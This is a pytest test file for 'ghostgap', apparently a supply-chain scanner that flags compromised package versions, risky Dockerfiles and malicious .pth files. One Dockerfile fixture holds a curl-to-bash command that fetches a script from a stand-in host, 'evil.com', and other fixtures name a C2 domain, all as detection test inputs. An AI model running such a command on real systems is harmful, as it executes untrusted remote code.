"""
Comprehensive tests for ghostgap core module.

Covers: ThreatFeed, SupplyChainFirewall (scan, manifest parsing, ecosystem
detection, verdict logic), data models, and the launcher warning system.
"""

import json
import os
import textwrap

import pytest

from ghostgap.core import (
    CureResult,
    Ecosystem,
    GhostGapResult,
    ManifestReport,
    ScanVerdict,
    SupplyChainFirewall,
    ThreatCategory,
    ThreatFeed,
    ThreatRecord,
    Verdict,
)


# ── ThreatFeed ──────────────────────────────────────────────────────────────


class TestThreatFeed:
    def test_builtin_threats_loaded(self):
        feed = ThreatFeed()
        assert feed.total_threats >= 20

    def test_ecosystems_covered(self):
        feed = ThreatFeed()
        expected = {"python", "nodejs", "ruby", "rust", "go", "java", "php", "docker"}
        assert feed.ecosystems == expected

    def test_check_known_bad_version(self):
        feed = ThreatFeed()
        threat = feed.check("litellm", "1.82.7", Ecosystem.PYTHON)
        assert threat is not None
        assert threat.threat_category == ThreatCategory.CREDENTIAL_THEFT
        assert "TeamPCP" in threat.actor

    def test_check_known_bad_version_182_8(self):
        feed = ThreatFeed()
        threat = feed.check("litellm", "1.82.8", Ecosystem.PYTHON)
        assert threat is not None

    def test_check_safe_version_returns_none(self):
        feed = ThreatFeed()
        assert feed.check("litellm", "1.82.6", Ecosystem.PYTHON) is None

    def test_check_unknown_package_returns_none(self):
        feed = ThreatFeed()
        assert feed.check("flask", "2.0.0", Ecosystem.PYTHON) is None

    def test_check_case_insensitive(self):
        feed = ThreatFeed()
        assert feed.check("LiteLLM", "1.82.7", Ecosystem.PYTHON) is not None

    def test_check_nodejs_event_stream(self):
        feed = ThreatFeed()
        threat = feed.check("event-stream", "3.3.6", Ecosystem.NODEJS)
        assert threat is not None
        assert threat.threat_category == ThreatCategory.BACKDOOR

    def test_check_ruby_rest_client(self):
        feed = ThreatFeed()
        threat = feed.check("rest-client", "1.6.13", Ecosystem.RUBY)
        assert threat is not None

    def test_check_rust_rustdecimal(self):
        feed = ThreatFeed()
        threat = feed.check("rustdecimal", "1.23.1", Ecosystem.RUST)
        assert threat is not None

    def test_check_java_log4j(self):
        feed = ThreatFeed()
        threat = feed.check(
            "org.apache.logging.log4j:log4j-core", "2.14.1", Ecosystem.JAVA
        )
        assert threat is not None
        assert "Log4Shell" in threat.description

    def test_check_php_phpunit(self):
        feed = ThreatFeed()
        threat = feed.check("phpunit/phpunit", "4.8.28", Ecosystem.PHP)
        assert threat is not None

    def test_check_wrong_ecosystem_returns_none(self):
        feed = ThreatFeed()
        # litellm is Python, not Node.js
        assert feed.check("litellm", "1.82.7", Ecosystem.NODEJS) is None

    def test_get_threat_by_name(self):
        feed = ThreatFeed()
        threat = feed.get_threat("litellm", Ecosystem.PYTHON)
        assert threat is not None
        assert threat.package == "litellm"

    def test_get_threat_nonexistent(self):
        feed = ThreatFeed()
        assert feed.get_threat("nonexistent-pkg", Ecosystem.PYTHON) is None

    def test_add_custom_threat(self):
        feed = ThreatFeed()
        before = feed.total_threats
        feed.add(ThreatRecord(
            package="evil-pkg",
            ecosystem=Ecosystem.PYTHON,
            bad_versions=["0.1.0"],
            safe_version="N/A",
            threat_category=ThreatCategory.BACKDOOR,
            actor="test",
            description="Test threat",
        ))
        assert feed.total_threats == before + 1
        assert feed.check("evil-pkg", "0.1.0", Ecosystem.PYTHON) is not None

    def test_add_custom_threat_safe_version_not_flagged(self):
        feed = ThreatFeed()
        feed.add(ThreatRecord(
            package="evil-pkg",
            ecosystem=Ecosystem.PYTHON,
            bad_versions=["0.1.0"],
            safe_version="0.2.0",
            threat_category=ThreatCategory.BACKDOOR,
            actor="test",
            description="Test threat",
        ))
        assert feed.check("evil-pkg", "0.2.0", Ecosystem.PYTHON) is None

    def test_list_all_returns_all(self):
        feed = ThreatFeed()
        all_threats = feed.list_all()
        assert len(all_threats) == feed.total_threats
        assert all(isinstance(t, ThreatRecord) for t in all_threats)

    def test_litellm_guardrail_bug_separate_from_supply_chain(self):
        """The guardrail logging bug (1.82.0-1.82.2) is a separate entry."""
        feed = ThreatFeed()
        bug = feed.check("litellm", "1.82.0", Ecosystem.PYTHON)
        assert bug is not None
        assert "bug" in bug.actor.lower()
        attack = feed.check("litellm", "1.82.7", Ecosystem.PYTHON)
        assert attack is not None
        assert "TeamPCP" in attack.actor


# ── Scan Before Install ─────────────────────────────────────────────────────


class TestScanBeforeInstall:
    def test_block_known_compromised(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("litellm", "1.82.7")
        assert v.verdict == Verdict.BLOCK
        assert v.threat_category == ThreatCategory.CREDENTIAL_THEFT
        assert any("KNOWN COMPROMISED" in t for t in v.threats)

    def test_block_event_stream(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("event-stream", "3.3.6", Ecosystem.NODEJS)
        assert v.verdict == Verdict.BLOCK

    def test_block_rest_client(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("rest-client", "1.6.13", Ecosystem.RUBY)
        assert v.verdict == Verdict.BLOCK

    def test_block_rustdecimal(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("rustdecimal", "1.23.1", Ecosystem.RUST)
        assert v.verdict == Verdict.BLOCK

    def test_allow_safe_version(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("litellm", "1.82.6")
        assert v.verdict != Verdict.BLOCK
        assert not any("KNOWN COMPROMISED" in t for t in v.threats)

    def test_recommendation_includes_safe_version(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("litellm", "1.82.7")
        assert "1.82.6" in v.recommendation

    def test_scan_time_recorded(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("litellm", "1.82.7")
        assert v.scan_time_ms > 0

    def test_history_recorded(self):
        fw = SupplyChainFirewall()
        fw.scan_before_install("litellm", "1.82.7")
        fw.scan_before_install("flask", "2.0.0")
        assert len(fw.history) == 2

    def test_version_defaults_to_latest(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("nonexistent-safe-pkg")
        assert v.version == "latest"

    def test_all_nodejs_threats_block(self):
        """Every known compromised Node.js package/version should BLOCK."""
        fw = SupplyChainFirewall()
        cases = [
            ("event-stream", "3.3.6"),
            ("ua-parser-js", "0.7.29"),
            ("colors", "1.4.1"),
            ("node-ipc", "10.1.1"),
            ("coa", "2.0.3"),
            ("rc", "1.2.9"),
        ]
        for pkg, ver in cases:
            v = fw.scan_before_install(pkg, ver, Ecosystem.NODEJS)
            assert v.verdict == Verdict.BLOCK, f"{pkg}=={ver} should be BLOCK"


# ── Manifest Parsing ────────────────────────────────────────────────────────


class TestManifestParsing:
    def test_python_requirements_clean(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("flask==2.0.0\nrequests==2.28.0\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.PYTHON
        assert r.total_packages == 2
        assert r.clean == 2
        assert r.blocked == 0
        assert r.overall_verdict == Verdict.ALLOW

    def test_python_requirements_compromised(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("flask==2.0.0\nlitellm==1.82.7\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.total_packages == 2
        assert r.blocked == 1
        assert r.overall_verdict == Verdict.BLOCK

    def test_python_requirements_with_comments(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("# this is a comment\nflask==2.0.0\n\n# another comment\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.total_packages == 1
        assert r.clean == 1

    def test_python_requirements_with_flags(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("-r base.txt\nflask==2.0.0\n--extra-index-url https://foo\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.total_packages == 1

    def test_npm_package_json_clean(self, tmp_path):
        f = tmp_path / "package.json"
        f.write_text(json.dumps({
            "dependencies": {"express": "^4.18.0", "lodash": "^4.17.21"}
        }))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.NODEJS
        assert r.total_packages == 2
        assert r.clean == 2

    def test_npm_package_json_compromised(self, tmp_path):
        f = tmp_path / "package.json"
        f.write_text(json.dumps({
            "dependencies": {"event-stream": "3.3.6", "express": "^4.18.0"}
        }))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.blocked == 1
        assert r.overall_verdict == Verdict.BLOCK

    def test_npm_devdependencies_also_scanned(self, tmp_path):
        f = tmp_path / "package.json"
        f.write_text(json.dumps({
            "devDependencies": {"colors": "1.4.1"}
        }))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.blocked == 1

    def test_gemfile_clean(self, tmp_path):
        f = tmp_path / "Gemfile"
        f.write_text("gem 'rails', '~> 7.0'\ngem 'puma', '~> 5.0'\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.RUBY
        assert r.total_packages == 2
        assert r.clean == 2

    def test_gemfile_compromised(self, tmp_path):
        f = tmp_path / "Gemfile"
        f.write_text("gem 'rest-client', '1.6.13'\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.blocked == 1

    def test_gemfile_lock(self, tmp_path):
        f = tmp_path / "Gemfile.lock"
        f.write_text(textwrap.dedent("""\
            GEM
              remote: https://rubygems.org/
              specs:
                rest-client (1.6.13)
                rails (7.0.0)
        """))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.total_packages == 2
        assert r.blocked == 1

    def test_cargo_lock(self, tmp_path):
        f = tmp_path / "Cargo.lock"
        f.write_text(textwrap.dedent("""\
            [[package]]
            name = "serde"
            version = "1.0.188"

            [[package]]
            name = "rustdecimal"
            version = "1.23.1"
        """))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.RUST
        assert r.total_packages == 2
        assert r.blocked == 1

    def test_go_mod(self, tmp_path):
        f = tmp_path / "go.mod"
        f.write_text(textwrap.dedent("""\
            module example.com/myapp

            go 1.21

            require (
                github.com/gin-gonic/gin v1.9.1
            )
        """))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.GO
        assert r.total_packages >= 1

    def test_pom_xml(self, tmp_path):
        f = tmp_path / "pom.xml"
        f.write_text(textwrap.dedent("""\
            <project>
              <dependencies>
                <dependency>
                  <groupId>org.apache.logging.log4j</groupId>
                  <artifactId>log4j-core</artifactId>
                  <version>2.14.1</version>
                </dependency>
              </dependencies>
            </project>
        """))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.JAVA
        assert r.blocked == 1

    def test_composer_json(self, tmp_path):
        f = tmp_path / "composer.json"
        f.write_text(json.dumps({
            "require": {"phpunit/phpunit": "4.8.28"}
        }))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.PHP
        assert r.blocked == 1

    def test_cargo_toml_dependencies(self, tmp_path):
        f = tmp_path / "Cargo.toml"
        f.write_text(textwrap.dedent("""\
            [package]
            name = "myapp"
            version = "0.1.0"

            [dependencies]
            serde = "1.0.188"
            rustdecimal = "1.23.1"
        """))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.RUST
        assert r.total_packages == 2
        assert r.blocked == 1

    def test_build_gradle_compromised(self, tmp_path):
        f = tmp_path / "build.gradle"
        f.write_text("implementation 'com.google.protobuf:protobuf-java:3.16.0'\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.JAVA
        assert r.blocked == 1

    def test_composer_lock(self, tmp_path):
        f = tmp_path / "composer.lock"
        f.write_text(json.dumps({
            "packages": [{"name": "phpunit/phpunit", "version": "4.8.28"}],
            "packages-dev": [],
        }))
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.PHP
        assert r.blocked == 1

    def test_dockerfile_unpinned_image(self, tmp_path):
        f = tmp_path / "Dockerfile"
        f.write_text("FROM node\nRUN npm install\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.ecosystem == Ecosystem.DOCKER
        assert r.review >= 1

    def test_dockerfile_latest_tag(self, tmp_path):
        f = tmp_path / "Dockerfile"
        f.write_text("FROM python:latest\nRUN pip install flask\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.review >= 1

    def test_dockerfile_pinned_image_clean(self, tmp_path):
        f = tmp_path / "Dockerfile"
        f.write_text("FROM python:3.12-slim\nRUN pip install flask\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.clean >= 1

    def test_dockerfile_curl_pipe_bash_blocked(self, tmp_path):
        f = tmp_path / "Dockerfile"
        f.write_text("FROM python:3.12\nRUN curl -sSL https://evil.com/install.sh | bash\n")
        fw = SupplyChainFirewall()
        r = fw.scan_manifest(str(f))
        assert r.blocked >= 1
        assert r.overall_verdict == Verdict.BLOCK

    def test_nonexistent_manifest(self):
        fw = SupplyChainFirewall()
        r = fw.scan_manifest("/nonexistent/requirements.txt")
        assert r.total_packages == 0


# ── Ecosystem Detection ─────────────────────────────────────────────────────


class TestEcosystemDetection:
    def setup_method(self):
        self.fw = SupplyChainFirewall()

    def test_requirements_txt(self):
        assert self.fw._detect_ecosystem("requirements.txt") == Ecosystem.PYTHON

    def test_requirements_dev_txt(self):
        assert self.fw._detect_ecosystem("requirements-dev.txt") == Ecosystem.PYTHON

    def test_package_json(self):
        assert self.fw._detect_ecosystem("package.json") == Ecosystem.NODEJS

    def test_yarn_lock(self):
        assert self.fw._detect_ecosystem("yarn.lock") == Ecosystem.NODEJS

    def test_gemfile(self):
        assert self.fw._detect_ecosystem("Gemfile") == Ecosystem.RUBY

    def test_cargo_toml(self):
        assert self.fw._detect_ecosystem("Cargo.toml") == Ecosystem.RUST

    def test_cargo_lock(self):
        assert self.fw._detect_ecosystem("Cargo.lock") == Ecosystem.RUST

    def test_go_mod(self):
        assert self.fw._detect_ecosystem("go.mod") == Ecosystem.GO

    def test_pom_xml(self):
        assert self.fw._detect_ecosystem("pom.xml") == Ecosystem.JAVA

    def test_build_gradle(self):
        assert self.fw._detect_ecosystem("build.gradle") == Ecosystem.JAVA

    def test_composer_json(self):
        assert self.fw._detect_ecosystem("composer.json") == Ecosystem.PHP

    def test_dockerfile(self):
        assert self.fw._detect_ecosystem("Dockerfile") == Ecosystem.DOCKER


# ── Verdict Logic ───────────────────────────────────────────────────────────


class TestVerdictLogic:
    """Test the verdict decision matrix without hitting the network."""

    def test_known_threat_always_blocks(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("litellm", "1.82.7")
        assert v.verdict == Verdict.BLOCK

    def test_unknown_clean_package_allows(self):
        """A package not in the threat feed and with no deep scan results → ALLOW."""
        fw = SupplyChainFirewall()
        # Use a package that won't be found by pip download (no deep scan)
        v = fw.scan_before_install("this-package-does-not-exist-xyz-123", "0.0.1")
        assert v.verdict == Verdict.ALLOW


# ── Data Models ─────────────────────────────────────────────────────────────


class TestDataModels:
    def test_scan_verdict_defaults(self):
        v = ScanVerdict(
            package="test", version="1.0", ecosystem=Ecosystem.PYTHON,
            verdict=Verdict.ALLOW,
        )
        assert v.threats == []
        assert v.credential_access == []
        assert v.obfuscation_score == 0.0

    def test_manifest_report_defaults(self):
        r = ManifestReport(manifest_path="test.txt", ecosystem=Ecosystem.PYTHON)
        assert r.total_packages == 0
        assert r.overall_verdict == Verdict.ALLOW

    def test_ghost_gap_result_defaults(self):
        r = GhostGapResult()
        assert r.safe is True
        assert r.infected is False

    def test_cure_result_defaults(self):
        r = CureResult()
        assert r.was_infected is False
        assert r.system_clean is False

    def test_threat_record_fields(self):
        t = ThreatRecord(
            package="evil", ecosystem=Ecosystem.PYTHON,
            bad_versions=["1.0"], safe_version="0.9",
            threat_category=ThreatCategory.BACKDOOR,
        )
        assert t.actor == ""
        assert t.iocs == []
        assert t.persistence_paths == []


# ── CI Gate ─────────────────────────────────────────────────────────────────


class TestCIGate:
    def test_clean_manifest_returns_zero(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("flask==2.0.0\n")
        fw = SupplyChainFirewall()
        assert fw.ci_gate(str(f)) == 0

    def test_compromised_manifest_returns_one(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("litellm==1.82.7\n")
        fw = SupplyChainFirewall()
        assert fw.ci_gate(str(f)) == 1


# ── Launcher Warning ────────────────────────────────────────────────────────


class TestLauncherWarning:
    def test_check_for_malicious_pth_clean(self, tmp_path, monkeypatch):
        from ghostgap.launcher import _check_for_malicious_pth
        clean_dir = tmp_path / "site-packages"
        clean_dir.mkdir()
        monkeypatch.setattr("sys.path", [str(clean_dir)])
        threats = _check_for_malicious_pth()
        assert threats == []

    def test_check_for_malicious_pth_detects_litellm_init(self, tmp_path, monkeypatch):
        from ghostgap.launcher import _check_for_malicious_pth
        # Create fake site-packages with malicious .pth
        site_dir = tmp_path / "site-packages"
        site_dir.mkdir()
        (site_dir / "litellm_init.pth").write_text("import os\n")

        monkeypatch.setattr("sys.path", [str(site_dir)])
        threats = _check_for_malicious_pth()
        assert len(threats) == 1
        assert "litellm" in threats[0][1]

    def test_check_for_malicious_pth_detects_c2_signature(self, tmp_path, monkeypatch):
        from ghostgap.launcher import _check_for_malicious_pth
        site_dir = tmp_path / "site-packages"
        site_dir.mkdir()
        (site_dir / "sneaky.pth").write_text("import os; models.litellm.cloud\n")

        monkeypatch.setattr("sys.path", [str(site_dir)])
        threats = _check_for_malicious_pth()
        assert len(threats) == 1
        assert "C2 signature" in threats[0][1]

    def test_warn_pth_compromise_writes_to_stderr(self, capsys):
        from ghostgap.launcher import _warn_pth_compromise
        _warn_pth_compromise([("/fake/path/evil.pth", "test reason")])
        captured = capsys.readouterr()
        assert "ALREADY EXECUTED" in captured.err
        assert "ghostgap-safe.sh" in captured.err


# ── Python API ──────────────────────────────────────────────────────────────


class TestPythonAPI:
    """Test the public Python API documented in README."""

    def test_scan_before_install_api(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("litellm", "1.82.7")
        assert v.verdict == Verdict.BLOCK

    def test_scan_before_install_cross_ecosystem(self):
        fw = SupplyChainFirewall()
        v = fw.scan_before_install("event-stream", "3.3.6", Ecosystem.NODEJS)
        assert v.verdict == Verdict.BLOCK
        v = fw.scan_before_install("rest-client", "1.6.13", Ecosystem.RUBY)
        assert v.verdict == Verdict.BLOCK

    def test_scan_manifest_api(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("flask==2.0.0\n")
        fw = SupplyChainFirewall()
        report = fw.scan_manifest(str(f))
        assert report.blocked == 0

    def test_custom_threat_integration(self):
        """Custom threats added to feed should be caught by scan."""
        fw = SupplyChainFirewall()
        fw.threat_feed.add(ThreatRecord(
            package="my-internal-pkg",
            ecosystem=Ecosystem.PYTHON,
            bad_versions=["0.1.0"],
            safe_version="0.2.0",
            threat_category=ThreatCategory.BACKDOOR,
            actor="attacker",
            description="Custom threat",
        ))
        v = fw.scan_before_install("my-internal-pkg", "0.1.0")
        assert v.verdict == Verdict.BLOCK

    def test_ci_gate_api(self, tmp_path):
        f = tmp_path / "requirements.txt"
        f.write_text("litellm==1.82.7\n")
        fw = SupplyChainFirewall()
        assert fw.ci_gate(str(f)) == 1


# ── Enums ───────────────────────────────────────────────────────────────────


class TestEnums:
    def test_verdict_values(self):
        assert Verdict.ALLOW.value == "allow"
        assert Verdict.REVIEW.value == "review"
        assert Verdict.BLOCK.value == "block"

    def test_ecosystem_values(self):
        assert Ecosystem.PYTHON.value == "python"
        assert Ecosystem.NODEJS.value == "nodejs"
        assert Ecosystem.DOCKER.value == "docker"

    def test_all_8_ecosystems(self):
        assert len(Ecosystem) == 8

    def test_threat_category_values(self):
        assert ThreatCategory.BACKDOOR.value == "backdoor"
        assert ThreatCategory.CREDENTIAL_THEFT.value == "credential_theft"
        assert ThreatCategory.CRYPTOMINER.value == "cryptominer"
